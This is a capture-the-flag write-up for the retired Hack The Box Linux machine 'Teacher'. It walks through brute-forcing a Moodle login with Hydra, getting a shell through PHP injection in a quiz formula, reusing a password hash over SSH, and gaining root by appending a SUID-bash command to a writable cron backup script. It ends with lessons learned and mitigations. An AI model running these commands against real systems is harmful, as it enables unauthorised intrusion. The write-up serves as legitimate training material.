---
machine: Teacher
os: Linux
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [linux, web, moodle, hydra, sqli, cron]
---

# Teacher — Hack The Box (Linux)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference note; no real flags or credentials.

## TL;DR

A PNG image contains text with most of the Moodle password; Hydra completes the last character. The Moodle quiz allows PHP injection and yields a shell. The database leaks `giovanni`'s MD5 hash, reused over SSH, and a cron-run backup script is writable, leading to root.

## Recon

```bash
nmap -Pn -sCV -p22,80 <IP>
```

- Ports: `22/tcp` SSH and `80/tcp` HTTP.
- Services: Apache with Moodle and SSH.
- Technologies: Moodle, PHP, MySQL, MD5, cron and bash.

## Enumeration

- `teacher.htb` running Moodle.
- PNG image that actually contains text.
- Course quiz with calculated questions.
- User `giovanni` and a backup cron job.

## Foothold

Download the image and use `strings` to reveal most of the password. Hydra tests the final character against the Moodle login. Inject PHP into a calculated quiz question and execute it on preview.

```bash
curl -s -O http://teacher.htb/images/<IMAGE>.png
strings <IMAGE>.png
hydra -l <USER> -P chars.txt teacher.htb http-post-form \
  '/login/index.php:username=^USER^&password=^PASS^:Invalid login'
# Inject PHP into the quiz formula and preview it
curl -s -b moodle.txt 'http://teacher.htb/mod/quiz/attempt.php?attempt=<ID>'
```

## Lateral movement

The shell exposes the Moodle database. Crack or reuse `giovanni`'s MD5 hash; the password opens SSH.

## Privilege escalation

A cron job runs a backup script as root and the user can write to it. Append a line that creates a SUID copy of bash or runs a shell; the next cycle returns root.

```bash
pspy -f
ls -l /usr/bin/backup.sh
printf 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash\n' >> /usr/bin/backup.sh
/tmp/rootbash -p
```

## Evidence

- Hidden text in the PNG and Moodle login.
- PHP execution in the quiz.
- Cracked MD5 hash and modified cron script.

## Lessons learned

- Metadata and apparently harmless files can leak secrets.
- A quiz evaluating formulas is an execution surface.
- Privileged backup scripts must be immutable.

## Mitigation and detection

- Do not reuse passwords or leave clues in images.
- Disable PHP evaluation in Moodle content.
- Run backups with a dedicated account and non-writable scripts.

## References

- [0xdf — Teacher](https://0xdf.gitlab.io/2019/04/20/htb-teacher.html)
- [IppSec — Teacher](https://www.youtube.com/watch?v=u2-te8n2WbY)
- [Hack The Box — Teacher](https://app.hackthebox.com/machines/teacher)
